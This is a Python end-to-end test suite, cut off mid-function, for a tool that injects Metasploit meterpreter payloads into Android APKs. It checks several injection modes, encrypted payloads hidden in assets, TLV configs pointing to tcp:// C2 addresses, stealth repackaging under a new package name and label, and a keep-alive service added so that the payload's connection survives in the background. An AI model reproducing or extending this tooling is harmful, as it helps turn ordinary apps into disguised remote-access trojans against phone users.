#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
端到端自测：5 种典型 APK \u00d7 3 种模式 = 15 组。

    python tests/test_e2e.py              # 全跑
    python tests/test_e2e.py base noapp   # 只跑指定形态

每个形态现场用 smali.jar 编 dex、用 xml2axml 编二进制清单，再交给 main.py 处理，
最后用 ApkVerifier 校验产物（对齐 / dex 布局 / 清单改动 / 签名 / 版本矩阵）。
不需要真实 App，也不需要 Android SDK。临时文件写到 tests/_build（已 gitignore）。
"""
import json
import os
import shutil
import subprocess
import sys
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
PROJ = os.path.dirname(HERE)
BUILD = os.path.join(HERE, '_build')
JAR = os.path.join(PROJ, 'libs', 'jar')
JAVA = 'java'
PY = sys.executable

sys.path.insert(0, PROJ)

from utils import MsfConfig  # noqa: E402  (2.0 payload 配置自检)

APP_SMALI = '''.class public Lcom/example/demo/DemoApp;
.super Landroid/app/Application;
.source "DemoApp.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Application;-><init>()V
    return-void
.end method

.method public onCreate()V
    .locals 2
    invoke-super {p0}, Landroid/app/Application;->onCreate()V
    const-string v0, "DemoApp"
    const-string v1, "onCreate"
    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method
'''

ACTIVITY_SMALI = '''.class public Lcom/example/demo/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 1
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    return-void
.end method
'''

EXTRA_SMALI = '''.class public Lcom/example/demo/extra/Extra;
.super Ljava/lang/Object;
.source "Extra.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static hello()Ljava/lang/String;
    .locals 1
    const-string v0, "extra dex"
    return-object v0
.end method
'''

MANIFEST = '''<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.example.demo" android:versionName="1.0" android:versionCode="1">
  <uses-sdk android:minSdkVersion="{min_sdk}" android:targetSdkVersion="{target_sdk}"/>
  <uses-permission android:name="android.permission.INTERNET"/>
  <application{app_name} android:label="Demo"{extra_app}>
    <activity android:name=".MainActivity">
      <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
      </intent-filter>
    </activity>
    <service android:name=".CleanService">
      <intent-filter>
        <action android:name="com.example.demo.PING"/>
      </intent-filter>
    </service>
    <receiver android:name=".BootReceiver"/>
  </application>
</manifest>
'''

SERVICE_SMALI = '''.class public Lcom/example/demo/CleanService;
.super Landroid/app/Service;
.source "CleanService.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method
'''

RECEIVER_SMALI = '''.class public Lcom/example/demo/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0
    return-void
.end method
'''

VARIANTS = {
    'base':     dict(app_name=True,  lib=True,  target_sdk=33, min_sdk=21, multidex=False),
    'noapp':    dict(app_name=False, lib=True,  target_sdk=33, min_sdk=21, multidex=False),
    'multidex': dict(app_name=True,  lib=False, target_sdk=34, min_sdk=23, multidex=True),
    'nolib':    dict(app_name=True,  lib=False, target_sdk=30, min_sdk=21, multidex=False),
    'oldsdk':   dict(app_name=False, lib=False, target_sdk=22, min_sdk=19, multidex=False),
}

EXPECT = {
    'base':     {'kind': 'application', 'target_sdk': 33},
    'noapp':    {'kind': 'activity',    'target_sdk': 33},
    'multidex': {'kind': 'application', 'target_sdk': 34},
    'nolib':    {'kind': 'application', 'target_sdk': 30},
    'oldsdk':   {'kind': 'activity',    'target_sdk': 24},
}

# 每个形态都跑这些模式；5 = 零改 dex 注入（provider）、6 = 零改 dex + 加密 payload
MODES = (1, 2, 3, 5, 6)


def run(cmd, cwd=None):
    proc = subprocess.run(cmd, cwd=cwd, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT)
    if proc.returncode != 0:
        raise RuntimeError('command failed: %s\n%s' % (
            cmd, proc.stdout.decode('utf-8', 'replace')[-3000:]))
    return proc.stdout.decode('utf-8', 'replace')


def write(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'w', encoding='utf-8', newline='\n') as fp:
        fp.write(text)


def build_variant(name, cfg):
    """生成 <name>.apk。"""
    out = os.path.join(BUILD, name)
    if os.path.isdir(out):
        shutil.rmtree(out)
    smali = os.path.join(out, 'smali')
    apkroot = os.path.join(out, 'apkroot')
    os.makedirs(apkroot, exist_ok=True)

    write(os.path.join(smali, 'com/example/demo/MainActivity.smali'), ACTIVITY_SMALI)
    write(os.path.join(smali, 'com/example/demo/CleanService.smali'), SERVICE_SMALI)
    write(os.path.join(smali, 'com/example/demo/BootReceiver.smali'), RECEIVER_SMALI)
    if cfg['app_name']:
        write(os.path.join(smali, 'com/example/demo/DemoApp.smali'), APP_SMALI)

    dex = os.path.join(apkroot, 'classes.dex')
    run([JAVA, '-jar', os.path.join(JAR, 'smali.jar'), 'a', smali, '-o', dex])

    if cfg['multidex']:
        smali2 = os.path.join(out, 'smali2')
        write(os.path.join(smali2, 'com/example/demo/extra/Extra.smali'), EXTRA_SMALI)
        run([JAVA, '-jar', os.path.join(JAR, 'smali.jar'), 'a', smali2,
             '-o', os.path.join(apkroot, 'classes2.dex')])

    app_name = ' android:name=".DemoApp"' if cfg['app_name'] else ''
    extra_app = ''
    if cfg['app_name']:
        extra_app = ' android:extractNativeLibs="false"'
    xml = MANIFEST.format(min_sdk=cfg['min_sdk'], target_sdk=cfg['target_sdk'],
                          app_name=app_name, extra_app=extra_app)
    xmlpath = os.path.join(out, 'AndroidManifest.xml')
    write(xmlpath, xml)
    run([JAVA, '-jar', os.path.join(JAR, 'xml2axml.jar'), 'e', xmlpath,
         os.path.join(apkroot, 'AndroidManifest.xml')])

    with open(os.path.join(apkroot, 'resources.arsc'), 'wb') as fp:
        fp.write(b'FAKE_ARSC' + b'\x00' * 1016)
    write(os.path.join(apkroot, 'res/values/strings.xml'), '\x00' * 32)

    if cfg['lib']:
        abi = os.path.join(apkroot, 'lib', 'arm64-v8a')
        os.makedirs(abi, exist_ok=True)
        so_src = os.path.join(PROJ, 'libs', 'ShellDexDir', 'jni_lib',
                          'arm64-v8a', 'libsteady-lib.so')
        shutil.copyfile(so_src, os.path.join(abi, 'libdummy.so'))

    from utils.ApkZipper import ApkZipper
    apk = os.path.join(BUILD, name + '.apk')
    ApkZipper(apkroot, apk).Build()
    return apk


def run_main(apk, mode):
    """跑 main.py；返回 (rc, output)。"""
    args = [PY, 'main.py', '-n', apk, '-m', str(mode)]
    if mode in (1, 2, 5, 6):
        args += ['--lhost', '192.0.2.00', '--lport', '4444']
    if mode == 6:
        # 夹具 minSdk=21，2.0 起模式 6 会自动降级为明文 payload；
        # 这里显式抬到 26，保证常规用例真的覆盖 InMemoryDexClassLoader + 加密分支。
        args += ['--min-sdk', '26']
    proc = subprocess.run(args, cwd=PROJ, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT)
    return proc.returncode, proc.stdout.decode('utf-8', 'replace')


def dex_sha(apkpath):
    """返回 {dex 名: sha256}。"""
    import hashlib
    import zipfile
    with zipfile.ZipFile(apkpath) as zf:
        return {n: hashlib.sha256(zf.read(n)).hexdigest()
                for n in zf.namelist() if n.endswith('.dex')}


def check_output(apk, tmpdir):
    from utils.ApkVerifier import Verify
    from utils.ManifestTools import ReadInfo
    from utils.ApkZipper import safe_extract
    safe_extract(apk, tmpdir)
    return Verify(apk), ReadInfo(os.path.join(tmpdir, 'AndroidManifest.xml'))


def report_of():
    with open(os.path.join(PROJ, 'WorkDir', 'report.json'), encoding='utf-8') as fp:
        return json.load(fp)


def run_main_args(apk, extra, timeout=900):
    """跑 main.py 并追加任意参数；返回 (rc, output)。"""
    args = [PY, 'main.py', '-n', apk] + list(extra)
    proc = subprocess.run(args, cwd=PROJ, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, timeout=timeout)
    return proc.returncode, proc.stdout.decode('utf-8', 'replace')


def extra_cases(failures, apk):
    """2.0 新功能：模式 4 / --analyze / --dry-run / 马甲包 / --jobs 1 / --log。"""
    total = 0

    def record(tag, problems):
        nonlocal total
        total += 1
        if problems:
            failures.append(f'{tag}: ' + '; '.join(problems))
            print(f'  {tag}: FAIL ' + '; '.join(problems))
        else:
            print(f'  {tag}: PASS')

    # 1) 模式 4：只整备（不换壳、不改 dex、修 4KB so 并对齐）
    m4 = os.path.join(BUILD, 'extra_m4.apk')
    rc, out = run_main_args(apk, ['-m', '4', '-o', m4])
    problems = [] if rc == 0 else [f'exit={rc} ' + out.strip().splitlines()[-1]]
    if not problems:
        tmpdir = os.path.join(BUILD, 'extra_m4')
        shutil.rmtree(tmpdir, ignore_errors=True)
        os.makedirs(tmpdir, exist_ok=True)
        verify, info = check_output(m4, tmpdir)
        problems += list(verify['problems'])
        if verify['manifest']['application'] != 'com.example.demo.DemoApp':
            problems.append(f"mode4 不应换壳，实际 {verify['manifest']['application']}")
        if len(verify['dexes']) != 1:
            problems.append(f"mode4 不应改 dex，实际 {len(verify['dexes'])} 个")
        if not all(e['ok'] for e in verify['elfs']):
            problems.append('mode4 应把自带 so 修成 16KB 对齐')
        if verify['manifest']['permission_count'] > 3:
            problems.append('mode4 不应批量加权限')
    record('extra/mode4', problems)

    # 2) --analyze：未签名输入应报问题（rc=2），签名产物应全绿（rc=0）
    rc, out = run_main_args(apk, ['--analyze'])
    problems = []
    if rc != 2:
        problems.append(f'未签名输入 --analyze 应 exit=2，实际 {rc}')
    if '未签名' not in out and 'apksigner verify 未通过' not in out:
        problems.append('--analyze 未报告签名问题')
    record('extra/analyze-unsigned', problems)

    rc, out = run_main_args(m4, ['--analyze'])
    record('extra/analyze-signed', [] if rc == 0 else [f'exit={rc}'])

    # 3) --dry-run：不生成 APK
    before = set(os.listdir(BUILD))
    rc, out = run_main_args(apk, ['-m', '1', '--lhost', '192.0.2.00', '--lport', '4444',
                                  '--dry-run'])
    problems = []
    if rc != 0:
        problems.append(f'exit={rc}')
    if '执行计划' not in out:
        problems.append('--dry-run 未打印计划')
    after = set(os.listdir(BUILD))
    created = {n for n in after - before if n.endswith('.apk')}
    if created:
        problems.append(f'--dry-run 不该生成 APK: {created}')
    record('extra/dry-run', problems)

    # 4) 马甲包 + 单线程 + 日志
    stealth = os.path.join(BUILD, 'extra_stealth.apk')
    logpath = os.path.join(BUILD, 'extra_stealth.log')
    rc, out = run_main_args(apk, [
        '-m', '1', '--lhost', '192.0.2.00', '--lport', '4444',
        '--rename-package', 'com.example.renamed', '--label', '测试应用',
        '--jobs', '1', '--log', logpath, '-o', stealth])
    problems = [] if rc == 0 else [f'exit={rc} ' + out.strip().splitlines()[-1]]
    if not problems:
        tmpdir = os.path.join(BUILD, 'extra_stealth')
        shutil.rmtree(tmpdir, ignore_errors=True)
        os.makedirs(tmpdir, exist_ok=True)
        verify, info = check_output(stealth, tmpdir)
        problems += list(verify['problems'])
        if verify['manifest']['package'] != 'com.example.renamed':
            problems.append(f"包名未改: {verify['manifest']['package']}")
        if info.get('label') != '测试应用':
            problems.append(f"显示名未改: {info.get('label')}")
        if verify['manifest']['launcher_activity'] != 'com.example.demo.MainActivity':
            problems.append('启动 Activity 应被补全成旧包名绝对名，'
                            f"实际 {verify['manifest']['launcher_activity']}")
        rep = report_of()
        if rep.get('shell_application') != 'com.example.demo.DemoApp':
            problems.append('壳 meta-data app_name 应为原 Application')
        if rep.get('jobs') != 1:
            problems.append(f"jobs 应为 1，实际 {rep.get('jobs')}")
        if not (os.path.isfile(logpath) and os.path.getsize(logpath) > 200):
            problems.append('--log 未写出日志')
    record('extra/stealth-package', problems)

    # 5) --quiet：只剩成功/错误行
    rc, out = run_main_args(apk, ['-m', '3', '--quiet', '-o', os.path.join(BUILD, 'extra_q.apk')])
    problems = []
    if rc != 0:
        problems.append(f'exit={rc}')
    if 'mode 3' in out and '[+] 产物' not in out:
        problems.append('--quiet 应保留成功行')
    record('extra/quiet', problems)

    # 5.5) 模式 5 + 马甲包：provider 必须落在新包名下、宿主 dex 不变
    m5s = os.path.join(BUILD, 'extra_m5_stealth.apk')
    rc, out = run_main_args(apk, [
        '-m', '5', '--lhost', '192.0.2.00', '--lport', '4444',
        '--rename-package', 'com.example.m5', '--label', '零改注入',
        '-o', m5s])
    problems = [] if rc == 0 else [f'exit={rc} ' + out.strip().splitlines()[-1]]
    if not problems:
        tmpdir = os.path.join(BUILD, 'extra_m5_stealth')
        shutil.rmtree(tmpdir, ignore_errors=True)
        os.makedirs(tmpdir, exist_ok=True)
        verify, info = check_output(m5s, tmpdir)
        problems += list(verify['problems'])
        if verify['manifest']['package'] != 'com.example.m5':
            problems.append(f"包名未改: {verify['manifest']['package']}")
        if info.get('label') != '零改注入':
            problems.append(f"显示名未改: {info.get('label')}")
        if verify['manifest']['application'] != 'com.example.demo.DemoApp':
            problems.append(f"mode5 不应换壳，实际 {verify['manifest']['application']}")
        provs = [c for c in info['components'] if c['tag'] == 'provider']
        if not provs:
            problems.append('mode5 未声明 provider')
        elif not provs[0]['name'].startswith('com.'):
            problems.append(f"provider 全限定名异常: {provs[0]['name']}")
        src_sha = dex_sha(apk)
        out_sha = dex_sha(m5s)
        for name_, h in src_sha.items():
            if out_sha.get(name_) != h:
                problems.append(f'mode5 马甲包改动了宿主 dex {name_}')
    record('extra/mode5-stealth', problems)

    # 6) install.py --check：体检入口能跑通，且不写任何文件
    envfile = os.path.join(PROJ, 'tools', 'env.sh')
    stat_before = os.path.getmtime(envfile) if os.path.isfile(envfile) else None
    proc = subprocess.run([PY, 'install.py', '--check'], cwd=PROJ,
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=600)
    out = proc.stdout.decode('utf-8', 'replace')
    problems = []
    if proc.returncode not in (0, 1):
        problems.append(f'install.py --check 异常退出 exit={proc.returncode}')
    for needle in ('Python', 'Java', 'libs/jar/baksmali.jar'):
        if needle not in out:
            problems.append(f'体检输出缺 {needle}')
    if proc.returncode == 0 and '== 结果汇总 ==' in out:
        problems.append('--check 通过时不应进入安装流程（不该出现结果汇总）')
    if stat_before is not None and os.path.isfile(envfile) \
            and os.path.getmtime(envfile) != stat_before:
        problems.append('--check 不应改写 tools/env.sh')
    record('extra/install-check', problems)

    # 7) 大小写冲突条目：Windows 上解包会把 res/-B.png 与 res/-b.png 合并，
    #    重打包后条目丢失 → App 一启动就崩（真实事故）。这里造一个只差大小写
    #    的 APK，验证「解包→重打包」条目数与 CRC 都不变。
    import zipfile as _zf
    col_apk = os.path.join(BUILD, 'extra_casecollide.apk')
    with _zf.ZipFile(apk) as src, _zf.ZipFile(col_apk, 'w', _zf.ZIP_DEFLATED) as dst:
        for item in src.infolist():
            if item.filename.startswith('META-INF/'):
                continue
            dst.writestr(item, src.read(item.filename))
        for n in ('res/x/B.png', 'res/x/b.png', 'res/x/B.PNG'):
            dst.writestr(n, b'payload-' + n.encode())
    from utils.ApkZipper import ApkZipper, safe_extract
    col_dir = os.path.join(BUILD, 'extra_casecollide_dir')
    shutil.rmtree(col_dir, ignore_errors=True)
    os.makedirs(col_dir, exist_ok=True)
    ex = safe_extract(col_apk, col_dir)
    col_out = os.path.join(BUILD, 'extra_casecollide_out.apk')
    ApkZipper(col_dir, col_out).Build()
    with _zf.ZipFile(col_apk) as a, _zf.ZipFile(col_out) as b:
        na = {i.filename: i.CRC for i in a.infolist()}
        nb = {i.filename: i.CRC for i in b.infolist()}
    problems = []
    if ex['collisions'] != 2:
        problems.append(f'应检出 2 个大小写冲突，实际 {ex["collisions"]}')
    missing = sorted(set(na) - set(nb))
    diff = sorted(n for n in set(na) & set(nb) if na[n] != nb[n])
    if missing:
        problems.append(f'重打包丢条目: {missing[:5]}')
    if diff:
        problems.append(f'重打包内容串位: {diff[:5]}')
    record('extra/case-collision', problems)

    # 9) 2.0：--mode-help 必须能把六种模式都讲清楚
    rc, out = run_main_args(apk, ['--mode-help'])
    problems = []
    if rc != 0:
        problems.append(f'--mode-help 退出码 {rc}')
    for token in ('模式 1', '模式 6', 'InMemoryDexClassLoader', '怎么选'
                  , '适用机型', '什么时候用'):
        if token not in out:
            problems.append(f'--mode-help 输出缺少「{token}」')
    record('extra/mode-help', problems)

    # 10) 2.0：目标 minSdk < 26 时，模式 6 要自动降级成明文 payload
    low = os.path.join(BUILD, 'extra_low26.apk')
    rc, out = run_main_args(apk, [
        '-m', '6', '--lhost', '192.0.2.00', '--lport', '4444', '--jobs', '2',
        '-o', low])
    problems = []
    if rc != 0:
        problems.append(f'低 minSdk 模式 6 应降级成功，退出码 {rc}')
    if '自动降级' not in out:
        problems.append('没有提示自动降级')
    rp = os.path.join(PROJ, 'WorkDir', 'report.json')
    if os.path.isfile(rp):
        import json as _json
        rep = _json.load(open(rp, encoding='utf-8'))
        if not rep.get('payload_encrypted_fallback'):
            problems.append('report 缺 payload_encrypted_fallback')
        if (rep.get('inject') or {}).get('strategy') != 'content-provider':
            problems.append('降级后 strategy 应为 content-provider')
        if any(d.get('name') == 'assets/apkhook/payload.bin'
               for d in rep['verify']['dexes']):
            problems.append('降级后不应还有加密 payload 资源')
    if os.path.isfile(low):
        with _zf.ZipFile(low) as z:
            if any(n.startswith('assets/apkhook/') for n in z.namelist()):
                problems.append('降级后的包不应该有 assets/apkhook/')
    else:
        problems.append('降级后没有产物')
    record('extra/compat-fallback', problems)

    # 11) 2.0：--strict-compat 时不降级，直接报错退出
    rc, out = run_main_args(apk, [
        '-m', '6', '--lhost', '192.0.2.00', '--lport', '4444', '--strict-compat'])
    problems = []
    if rc == 0:
        problems.append('--strict-compat 应该失败退出')
    if 'InMemoryDexClassLoader' not in out:
        problems.append('报错信息应说明 InMemoryDexClassLoader 不可用')
    if '自动降级' in out:
        problems.append('严格模式下不该提示自动降级')
    record('extra/compat-strict', problems)

    # 12) 2.0：内置 stager 必须带「Android 14+ 动态加载只读」补丁
    rc, out = run_main_args(apk, [
        '-m', '5', '--lhost', '192.0.2.00', '--lport', '4444', '--jobs', '2',
        '-o', os.path.join(BUILD, 'extra_stager.apk')])
    problems = []
    if rc != 0:
        problems.append(f'模式 5 打包失败，退出码 {rc}')
    payload = os.path.join(PROJ, 'WorkDir', 'dexfile', 'built', 'payload.dex')
    if not os.path.isfile(payload):
        problems.append('没有生成 payload.dex')
    else:
        blob = open(payload, 'rb').read().decode('latin-1')
        for token in ('setReadOnly', 'stage saved read-only',
                      'stage load or exec failed'):
            if token not in blob:
                problems.append(f'payload.dex 缺少 stager 补丁标记「{token}」')
    record('extra/stager-patched', problems)

    # 13) 2.0：payload 配置必须是 TLV（现代 meterpreter 用
    #     ConfigParser/TLVPacket 解析；定长旧格式会抛 NegativeArraySizeException，
    #     表现为「Meterpreter session N is not valid and will be closed / Died」）
    problems = []
    rc, out = run_main_args(apk, [
        '-m', '6', '--min-sdk', '26', '--lhost', '192.0.2.01', '--lport', '5555',
        '--jobs', '2', '-o', os.path.join(BUILD, 'extra_tlv.apk')])
    if rc != 0:
        problems.append(f'模式 6 打包失败，退出码 {rc}')
    payload = os.path.join(PROJ, 'WorkDir', 'dexfile', 'built', 'payload.dex')
    if not os.path.isfile(payload):
        problems.append('没有生成 payload.dex')
    else:
        blob = open(payload, 'rb').read()
        info = None
        # 配置块在 dex 里的偏移会随 smali 往返变化，逐个偏移试解析
        for off in range(0, max(0, len(blob) - MsfConfig.CONFIG_BLOCK_SIZE) + 1):
            try:
                info = MsfConfig.verify_config_block(
                    blob[off:off + MsfConfig.CONFIG_BLOCK_SIZE], '192.0.2.01', 5555)
            except Exception:
                continue
            break
        if not info:
            problems.append('payload.dex 里找不到合法的 TLV 配置块')
        else:
            if info['packet_type'] != MsfConfig.PACKET_TYPE_CONFIG:
                problems.append(f"packet 类型不是 CONFIG：{info['packet_type']}")
            if info['uuid_len'] != 16 or info['session_guid_len'] != 16:
                problems.append('UUID/SESSION_GUID 长度不是 16')
            if not info['c2']:
                problems.append('没有 C2 传输组')
            elif 'tcp://192.0.2.01:5555' not in info['c2'][0]['url']:
                problems.append(f"C2 URL 不对：{info['c2'][0]['url']}")
    # 旧格式必须被拒绝（回归保护：别又改回定长布局）
    legacy = (bytes(48) + b'tcp://192.0.2.01:5555'.ljust(512, b'\x00')
              + b'\x00\x00\x01\x2c' + b'\x00\x00\x0e\x10' + b'\x00\x00\x00\x0a'
              + bytes(6) + b'\xff\xff\xff\xff')
    legacy = legacy + bytes(MsfConfig.CONFIG_BLOCK_SIZE - len(legacy))
    try:
        MsfConfig.verify_config_block(legacy)
    except MsfConfig.MsfConfigError:
        pass
    else:
        problems.append('旧定长配置竟然也解析通过，校验逻辑失效了')
    record('extra/msf-config-tlv', problems)
    # extra/stager-config-url: stager reads connect url from block offset 0x1000
    rc, output = run_main_args(apk, ['-m', '6', '--min-sdk', '26',
                                     '--lhost', '192.0.2.02', '--lport', '4444',
                                     '--jobs', '2',
                                     '-o', os.path.join('BUILD', 'extra_stager_url.apk')])
    problems = []
    if rc != 0:
        problems.append('main.py exit=%d' % rc)
    else:
        blob = open(os.path.join(PROJ, 'WorkDir', 'dexfile', 'built', 'payload.dex'), 'rb').read()
        want = b'tcp://192.0.2.02:4444'
        hit = False
        for off in range(0, max(0, len(blob) - MsfConfig.CONFIG_BLOCK_SIZE) + 1):
            p = off + MsfConfig.URL_OFFSET
            if blob[p:p + len(want)] == want:
                hit = True
                break
        if not hit:
            problems.append('no ascii url at offset 0x1000 in config block')
    record('extra/stager-config-url', problems)
    # extra/keepalive-service: provider modes must ship a foreground keep-alive
    # service + the matching permissions, otherwise Android freezes the app
    # when it goes to background and the payload socket dies.
    rc, output = run_main_args(apk, ['-m', '6', '--min-sdk', '26',
                                     '--lhost', '192.0.2.03', '--lport', '4444',
                                     '--jobs', '2',
                                     '-o', os.path.join('BUILD', 'extra_keepalive.apk')])
    problems = []
    if rc != 0:
        problems.append('main.py exit=%d' % rc)
    else:
        rep = json.load(open(os.path.join(PROJ, 'WorkDir', 'report.json'),
                             encoding='utf-8'))
        keep = rep.get('keepalive_service')
        if not keep:
            problems.append('report 里没有 keepalive_service')
        svc = (rep.get('manifest_patch') or {}).get('service') or {}
        if not svc:
            problems.append('manifest 里没写 service')
        elif svc.get('foreground_service_type') != 1:
            problems.append('foreground_service_type=%r' % svc.get('foreground_service_type'))
        elif keep and svc.get('name') != keep:
            problems.append('service name 与 report 不一致')
        added = set((rep.get('manifest_patch') or {}).get('permissions_added') or [])
        for perm in ('android.permission.FOREGROUND_SERVICE',
                     'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
                     'android.permission.WAKE_LOCK'):
            if perm not in added:
                problems.append('少了权限 %s' % perm)
    record('extra/keepalive-service', problems)
    return total


def main():
    failures = []
    os.makedirs(BUILD, exist_ok=True)
    only = [a for a in sys.argv[1:] if not a.startswith('-')]
    selected = {k: v for k, v in VARIANTS.items() if not only or k in only}
    if not selected:
        print('未知形态: %s\n可选: %s' % (only, ', '.join(VARIANTS)))
        return 2
    for name, cfg in selected.items():
        apk = build_variant(name, cfg)
        print('=' * 70)
        print(f'[{name}] built {os.path.basename(apk)} '
              f'({os.path.getsize(apk)} B)')
        for mode in MODES:
            rc, output = run_main(apk, mode)
            tag = f'{name}/mode{mode}'
            if rc != 0:
                failures.append(f'{tag}: main.py exit={rc}\n' +
                                '\n'.join(output.strip().splitlines()[-12:]))
                print(f'  mode{mode}: FAIL exit={rc}')
                continue

            rep = report_of()
            prod = rep['output'] if 'output' in rep else None
            tmpdir = os.path.join(BUILD, f'{name}_m{mode}_out')
            if os.path.isdir(tmpdir):
                shutil.rmtree(tmpdir)
            os.makedirs(tmpdir, exist_ok=True)
            verify, info = check_output(os.path.join(PROJ, 'WorkDir', 'AllFinish.apk'),
                                        tmpdir)
            problems = list(verify['problems'])
            exp = EXPECT[name]

            # 注入策略：模式 1 由壳反射启动（不改宿主 dex），模式 2 走 provider
            if mode == 1:
                strat = rep['inject'].get('strategy')
                if strat != 'shell-reflect':
                    problems.append(f"模式 1 注入策略 {strat} != shell-reflect")
                if rep['inject'].get('host_dex_modified') is not False:
                    problems.append('模式 1 不应改动宿主 dex')
            elif mode == 2:
                strat = rep['inject'].get('strategy')
                if strat != 'content-provider':
                    problems.append(f"模式 2 注入策略 {strat} != content-provider")
            # targetSdk 上调
            if verify['manifest']['target_sdk'] != exp['target_sdk']:
                problems.append(
                    f"targetSdk={verify['manifest']['target_sdk']} != 期望 {exp['target_sdk']}")
            # 壳 Application
            if mode in (1, 3):
                if verify['manifest']['application'] != 'com.sakuqi.steady.SteadyApplication':
                    problems.append('application 未被替换为壳')
            else:
                # mode2/5 不换壳：原 Application 必须保留
                want_app = 'com.example.demo.DemoApp' if cfg['app_name'] else None
                if verify['manifest']['application'] != want_app:
                    problems.append(
                        f"mode{mode} 应保留原 Application {want_app}，"
                        f"实际 {verify['manifest']['application']}")
            # exported：targetSdk>=31 且带 intent-filter 的组件必须有显式值
            if verify['manifest']['target_sdk'] >= 31:
                for comp in info['components']:
                    if comp['has_intent_filter'] and comp['exported'] is None:
                        problems.append(f"组件缺 android:exported: {comp['tag']} {comp['name']}")
            # dex 布局：mode1 = 壳(根 classes.dex) + 原 dex(加密, assets/*.bin) + payload(加密)
            #           mode3 = 壳 + 原 dex(加密)；mode2 = 原 dex + payload(明文);
            #           mode5 = 原 dex(原样) + payload(明文)
            original = 2 if cfg['multidex'] else 1
            want = original + (1 if mode in (1, 3) else 0)
            if mode in (1, 2, 5):
                want += 1          # payload 独立 dex
            if mode == 1:
                want += 1          # wrapper（保活服务）明文 dex
            if mode == 6:
                want += 1          # wrapper（provider + loader）明文 dex
            dexes = [d['name'] for d in verify['dexes']]
            if len(dexes) != want:
                problems.append(f'dex 数量 {dexes} != 期望 {want}')
            if mode in (1, 3):
                # 关键：根目录只能有壳自己的 classes.dex，其余 dex 必须藏在
                # assets/apkhook/dex/*.bin —— 否则 ART 打开 APK 时整包加载失败。
                root = [d['name'] for d in verify['dexes'] if d['kind'] == 'root']
                # 模式 1 另有 wrapper（保活服务）明文 dex；模式 3 只有壳
                want_root = ['classes.dex', 'classes2.dex'] if mode == 1 else ['classes.dex']
                if root != want_root:
                    problems.append(
                        f'mode{mode} 根目录应是 {want_root}，实际 {root}')
                asset = [d['name'] for d in verify['dexes'] if d['kind'] == 'asset']
                if len(asset) != want - len(want_root):
                    problems.append(
                        f'mode{mode} assets 里应有 {want - len(want_root)} 个加密 dex，'
                        f'实际 {asset}')
                plain = [d['name'] for d in verify['dexes'] if d['plaintext']]
                if plain != want_root:
                    problems.append(f'mode{mode} 明文 dex 应是 {want_root}，实际 {plain}')
                if mode == 1:
                    keep = rep.get('keepalive_service')
                    if not keep:
                        problems.append('mode1 缺 keepalive_service')
                    svc = (rep.get('manifest_patch') or {}).get('service') or {}
                    if svc.get('foreground_service_type') != 1:
                        problems.append(f'mode1 service 缺 foregroundServiceType: {svc}')
                    meta = {m['name']: m['value']
                            for m in (rep.get('manifest_patch') or {}).get('meta_data', [])}
                    if meta.get('apkhook_keep') != keep:
                        problems.append(f'mode1 meta apkhook_keep 不对: {meta}')
            if mode in (5, 6):
                # 宿主 dex 必须逐字节不变，payload/wrapper 必须明文
                src_sha = dex_sha(apk)
                out_sha = dex_sha(os.path.join(PROJ, 'WorkDir', 'AllFinish.apk'))
                for name_, h in src_sha.items():
                    if out_sha.get(name_) != h:
                        problems.append(f'mode{mode} 改动了宿主 dex {name_}')
                plain = [d['name'] for d in verify['dexes'] if d['plaintext']]
                if len(plain) != want:
                    problems.append(f'mode{mode} 所有 dex 都应明文，实际明文 {plain}')
                # 必须声明 provider，且不能拷壳库
                provs = [c for c in info['components'] if c['tag'] == 'provider']
                if not provs:
                    problems.append(f'mode{mode} 未在清单中声明 provider')
                elif not provs[0]['name'].endswith('Provider'):
                    problems.append(f"provider name 异常: {provs[0]['name']}")
                if rep['inject'].get('host_dex_modified') is not False:
                    problems.append(f'mode{mode} report 应标记 host_dex_modified=false')
            if mode == 6:
                # payload 必须是加密后放在 assets 里，而不是一个能直接读的 dex
                with zipfile.ZipFile(os.path.join(PROJ, 'WorkDir', 'AllFinish.apk')) as zf:
                    names = zf.namelist()
                    if 'assets/apkhook/payload.bin' not in names:
                        problems.append('mode6 缺少 assets/apkhook/payload.bin')
                    else:
                        blob = zf.read('assets/apkhook/payload.bin')
                        if len(blob) == 0:
                            problems.append('mode6 payload.bin 为空')
                        if blob[:4] == b'dex\n':
                            problems.append('mode6 payload.bin 未加密（明文 dex）')
                if rep['inject'].get('strategy') != 'assets-encrypted-payload':
                    problems.append(
                        f"mode6 strategy 应为 assets-encrypted-payload，"
                        f"实际 {rep['inject'].get('strategy')}")
            # .so：只有换壳的模式（1/3）才需要壳库
            so_names = [l['name'] for l in verify['alignment']['libs']]
            has_shell_lib = any(n.endswith('libsteady-lib.so') for n in so_names)
            if mode in (1, 3):
                if not has_shell_lib:
                    problems.append('缺少壳 libsteady-lib.so')
            elif has_shell_lib:
                problems.append(f'mode{mode} 不换壳，不应拷入 libsteady-lib.so')

            if problems:
